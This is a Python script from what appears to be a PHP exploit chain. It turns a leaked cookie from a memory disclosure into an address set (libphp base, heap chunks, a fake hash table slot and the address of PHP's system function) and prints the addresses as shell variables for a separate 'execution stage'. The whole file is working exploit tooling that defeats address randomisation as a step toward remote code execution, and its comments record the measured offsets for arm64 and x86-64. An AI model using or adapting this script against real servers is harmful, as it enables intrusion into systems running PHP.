#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

"""leak_addrs.py - turn a disclosure cookie into the addresses the execution stage needs.

The leak is only useful if it yields a complete address set, so this is deliberately a separate step
from decoding: it applies the two relations we measured (main chunk = disclosed chunk + 0x400000, and
each symbol offset inside libphp) and prints them either for a human or as shell assignments for the
driving script.

usage:
  leak_addrs.py --cookie-file /tmp/ck.txt                 # human readable
  eval "$(leak_addrs.py --cookie-file /tmp/ck.txt --emit shell)"
"""
import argparse
import sys
from collections import Counter

from decode_leak_cookie import (DEFAULT_SYMBOLS, MAX_PTR, MIN_PTR, load_cookie, slide_pointers,
                                summarise, to_bytes)

MAIN_DELTA = 0x400000   # measured: main chunk sits 4 MiB above the chunk the stale id lives in
S_OFF = 0xF8398         # fake zend_array slot inside the main chunk (reference layout)
HSV_OFF = 0x7D720       # the zval slot the fake reference must overwrite (reference layout)


def parse_symbols(items):
    symbols = dict(DEFAULT_SYMBOLS)
    for item in items:
        name, _, offset = item.partition("=")
        symbols[name.strip()] = int(offset.strip(), 0)
    return symbols


def main(argv=None):
    ap = argparse.ArgumentParser(description="address set for the execution stage")
    source = ap.add_mutually_exclusive_group(required=True)
    source.add_argument("--value")
    source.add_argument("--cookie-file")
    source.add_argument("--dump")
    ap.add_argument("--symbol", action="append", default=[],
                    help="name=offset inside libphp, e.g. zif_system=0x42cd70")
    ap.add_argument("--main-delta", type=lambda x: int(x, 0), default=None,
                    help="chunk bytes between the disclosed chunk and the main chunk; default is to "
                         "read the second chunk cluster out of the leak, which is what x86-64 needs")
    ap.add_argument("--s-off", type=lambda x: int(x, 0), default=S_OFF)
    ap.add_argument("--hsv-off", type=lambda x: int(x, 0), default=HSV_OFF)
    ap.add_argument("--min-cluster", type=int, default=16,
                    help="pointers a fingerprint cluster needs before it counts as a load base")
    ap.add_argument("--emit", choices=["text", "shell"], default="text")
    args = ap.parse_args(argv)

    symbols = parse_symbols(args.symbol)
    blob = to_bytes(load_cookie(args))
    result = summarise(blob, symbols)

    libphp = result["libphp_base"]
    if not libphp or result["libphp_weight"] < args.min_cluster:
        print("incomplete: no libphp base (%d pointers in the best cluster)"
              % result["libphp_weight"], file=sys.stderr)
        return 1
    disclosed = result["chunk_base"]
    if not disclosed:
        print("incomplete: no chunk cluster", file=sys.stderr)
        return 1

    # Which chunk is "main"? On arm64 it sat 4 MiB above the disclosed chunk and that held 3/3, so a
    # constant was good enough. On x86-64 the distance came back as 0x200000, 0x600000 and 0x800000 in
    # three fresh containers, and a fixed delta scored 1/3. The window always carries a second cluster of
    # chunk pointers - 454 of them - and that cluster *is* the main chunk, so it is read out of the leak
    # instead of being assumed. The 454 figure is itself stable: it appeared with 0x400000 on arm64 and
    # with every x86-64 distance measured.
    main_chunk = disclosed + args.main_delta if args.main_delta is not None else 0
    main_source = ("= disclosed + %#x (fixed delta)" % args.main_delta
                   if args.main_delta is not None else "")
    if not main_chunk:
        # `other_bases` cannot be used here: slide_pointers() steps one byte at a time, so each real
        # pointer contributes eight overlapping windows and the list fills with bases like 0x0 and
        # 0x100000000. Chunk clusters have to be counted on aligned qwords.
        aligned = [int.from_bytes(blob[i:i + 8], "little") for i in range(0, len(blob) - 7, 8)]
        aligned = [q for q in aligned if MIN_PTR <= q < MAX_PTR]
        clusters = Counter(q & ~0x1FFFFF for q in aligned)
        libphp_chunk = libphp & ~0x1FFFFF
        candidates = []
        for base, count in clusters.items():
            if base == disclosed or base == libphp_chunk:
                continue
            # A neighbouring chunk of this heap is 2 MiB aligned and sits 2..8 MiB from the disclosed
            # one: +4 MiB on arm64, +2/+6/+8 MiB on x86-64. The module's own buckets are much further
            # away -- 21 to 30 MiB in the layouts measured. A 16 MiB bound therefore excludes them while
            # keeping the real main chunk, which a 32 MiB "module range" blanket did not: on arm64 that
            # window started at libphp and swallowed main, leaving no candidates at all.
            if base & 0x1FFFFF or abs(base - disclosed) > (16 << 20):
                continue
            candidates.append((count, base))
        if not candidates:
            print("incomplete: no second chunk cluster; pass --main-delta explicitly", file=sys.stderr)
            return 1
        count, main_chunk = max(candidates)
        main_source = "= second chunk cluster in the leak (%d pointers, %+#x from disclosed)" % (
            count, main_chunk - disclosed)

    values = {
        "LIBPHP": libphp,
        "CHUNK": disclosed,
        "MAIN": main_chunk,
        "S": main_chunk + args.s_off,
        "HSV": main_chunk + args.hsv_off,
    }
    for name in ("zif_system", "zend_hash_destroy", "zval_ptr_dtor"):
        if name in symbols:
            values[name.upper()] = libphp + symbols[name]

    if args.emit == "shell":
        for name, value in values.items():
            print("%s=%#x" % (name, value))
        return 0

    print("decoded       : %d bytes, %d pointer windows" % (result["decoded_bytes"], result["pointer_windows"]))
    print("disclosed     : %#x   (%d pointers, %d%% of the window)"
          % (disclosed, result["chunk_base_votes"], round(100 * result["chunk_base_share"])))
    print("libphp        : %#x   (%d pointers in the fingerprint cluster)"
          % (libphp, result["libphp_weight"]))
    print("main chunk    : %#x   (%s)" % (main_chunk, main_source))
    print("S  (fake ht)  : %#x   (main + %#x)" % (values["S"], args.s_off))
    print("hsv (fake ref): %#x   (main + %#x)" % (values["HSV"], args.hsv_off))
    for name in ("ZIF_SYSTEM", "ZEND_HASH_DESTROY"):
        if name in values:
            print("%-13s : %#x" % (name.lower().replace("_", " "), values[name]))
    return 0


if __name__ == "__main__":
    sys.exit(main())
